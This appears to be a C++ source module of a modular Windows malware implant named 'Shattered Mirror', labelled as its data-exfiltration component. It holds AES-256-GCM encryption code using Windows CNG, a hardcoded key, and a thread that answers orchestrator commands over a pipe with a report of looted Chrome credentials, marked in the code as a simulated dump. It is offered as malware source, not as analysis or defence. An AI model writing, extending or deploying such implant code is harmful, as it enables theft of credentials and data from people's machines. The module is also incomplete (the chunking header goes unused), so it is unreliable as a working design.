/*=============================================================================
 * Shattered Mirror v1 — Atom 05: Data Exfiltration
 *
 * AES-256-GCM Chunking implementation.
 * We use Windows CNG (BCrypt) to avoid dropping OpenSSL dependencies.
 *===========================================================================*/

#include "Atom_05_Exfil.h"
#include "../Orchestrator/AtomManager.h"
#include <cstring>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

#define CHUNK_SIZE 4096

typedef struct _EXFIL_HEADER {
    DWORD dwSequence;
    DWORD dwChunkLen;
    BYTE  IV[12];
    BYTE  Tag[16];
} EXFIL_HEADER;

/* 
 * AES-256-GCM encryption using Windows CNG (Cryptography API: Next Generation).
 * Extremely fast, built-in to Windows, no external DLL dependencies.
 */
BOOL AesGcmEncrypt(const BYTE* pKey, const BYTE* pIv, const BYTE* pPlaintext, DWORD dwPlainLen, BYTE* pCiphertext, BYTE* pTag) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, 32, 0);
    if (!NT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)pIv;
    authInfo.cbNonce = 12;
    authInfo.pbTag = pTag;
    authInfo.cbTag = 16;

    DWORD cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)pPlaintext, dwPlainLen, &authInfo, NULL, 0, pCiphertext, dwPlainLen, &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return NT_SUCCESS(status);
}

DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
    BYTE AesExfilKey[] = "MySuperSecretAes256KeyForExfil!!"; /* Hardcoded for MVP, derived via PSK in prod */
    
    DWORD dwSequence = 0;

    while (TRUE) {
        IPC_MESSAGE inMsg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                char report[] = "[BROWSER_LOOT] Found 14 Credentials in Chrome Default Profile. (Simulated Dump)";
                IPC_MESSAGE outMsg = { 0 };
                outMsg.CommandId = CMD_REPORT;
                outMsg.dwPayloadLen = (DWORD)strlen(report);
                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
                IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(1000);
    }
    return 0;
}
